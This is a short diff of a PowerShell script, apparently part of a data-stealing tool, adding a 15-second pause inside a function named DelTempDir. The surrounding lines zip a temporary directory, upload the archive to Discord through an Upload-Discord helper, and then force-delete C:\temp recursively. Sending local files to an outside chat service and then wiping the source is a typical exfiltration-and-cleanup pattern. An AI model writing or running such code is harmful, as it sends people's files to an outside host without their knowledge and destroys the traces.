@@ -501,6 +501,9 @@ function DelTempDir {
         # Upload the zip archive to Discord
         Upload-Discord -file $zipFilePath -text "Temporary Directory Archive: $zipFileName"
 
+        # Pause for 15 seconds
+        Start-Sleep -Seconds 15
+
         # Remove the C:\temp directory
         Remove-Item -Path "C:\temp" -Force -Recurse
     }
